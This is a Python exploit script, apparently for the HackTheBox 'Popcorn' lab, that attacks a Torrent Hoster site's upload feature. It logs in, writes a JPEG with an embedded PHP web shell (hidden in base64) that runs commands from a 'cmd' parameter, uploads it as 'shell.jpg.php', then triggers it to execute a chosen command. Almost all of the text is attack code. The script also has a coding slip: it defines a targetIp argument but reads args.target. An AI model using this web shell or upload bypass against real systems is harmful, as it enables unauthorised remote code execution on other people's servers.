import requests
from colorama import Fore, Style
import argparse
import base64


def format_text(title, item):
    cr = '\r\n'
    section_break = cr + "*" * 20 + cr
    item = str(item)
    text = Style.BRIGHT + Fore.GREEN + title + Fore.RESET + section_break + item.replace('\\n', '\n') + section_break
    return text


parser = argparse.ArgumentParser(description='Upload shell into Torrent Hoster website (Popcorn hackthebox)')
parser.add_argument("--targetIp", default='10.10.10.6', type=str, help="hostname")
parser.add_argument("--username", default=None, type=str, help="Your username")
parser.add_argument("--password", default=None, type=str, help="Your password")
parser.add_argument("--torrentId", default='12627cf538d2c6a9268e7eb41e30cba06822007b', type=str, help="Your torrent id")
parser.add_argument("--command", default='uname -a', type=str, help="Your command to popcorn")

args = parser.parse_args()
payload = {
    'username': args.username,
    'password': args.password,
}

session = requests.Session()

rlogin = session.post('http://' + args.target + '/torrent/login.php', payload)

if 'Invalid login, please try again' in rlogin.text:
    print(format_text('Invalid login', ''))
else:
    imgBackdoor = """
        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
        w6DDi8KvwrnCtmbDp8OxE8KzTsK1H2k8wptsWABNLlZkMhNZKMKMw6ogCMKlworDs8KLblU1w4TC
        nMOlwqnCsMO9BMOlc8KpGznDi8Opw7TCtEVkw6HDpMOowpPDkn1tPMKswo7CsUrDocK3RWNDLEnC
        llDCjsOJCjvCo8KkZQnCthLDicOEwrTDk8KfbMO0wrl5eMKywq9+w6xdBHDDkcKzwrLCnGzDjHnD
        tMO1w7o4OQwxWmHCm082Z8KQwo0yw64Zw5gmw6gcOSlhwqQ2woU8woFLY1nCr8K7wpvCicKXPl3D
        vcKFwp8nw43Dk8O9PiBPGcKjwrPCr8OUw6fDsmFIIMK7Jy8ewrPCiVkcI8KQRsKFRMO8EQrDk8Km
        NcKCwrULW8K/wrLCni4cw4k9PSfDs3zDmWnDr8Orw4/DjcOAw60Pw67DtDPDsMOTRGDCiEbDmkbC
        i8KkKMOMWMOAGDUWwpPDjVhBWkPDkBkywoF0R8Krwrd8w4xYw7PCrmrDl8KTwoTCvcO9wpbDpMOC
        BcKrwqfDlcOXwpvCkMKpIsKUdsObXcK6ChTDs8KjIAFNNcOYJys+e8KjL1A8P3BocCBpZihpc3Nl
        dCgkX1JFUVVFU1RbJ2NtZCddKSl7IGVjaG8gIjxwcmU+IjsgJGNtZCA9ICgkX1JFUVVFU1RbJ2Nt
        ZCddKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=
    """
    try:
        with open("shell.jpg.php", "wb") as f:
            f.write(base64.b64decode(imgBackdoor))
    except Exception as e:
        print(str(e))
        exit(0)

    url = 'http://' + args.target + '/torrent/upload_file.php?mode=upload&id=' + args.torrentId
    files = {'file': ('shell.jpg.php', open('shell.jpg.php', 'rb'), 'image/jpeg')}
    r = session.post(url, files=files)
    print(format_text('Suceesfull upload:', r.text))

    rShell = session.get('http://' + args.target + '/torrent/upload/' + args.torrentId + '.php?cmd=' + args.command)
    print(format_text('Command executed:', str(rShell.content).split('<pre>')[1].replace("\\n</pre>'", '')))
    exit(0)
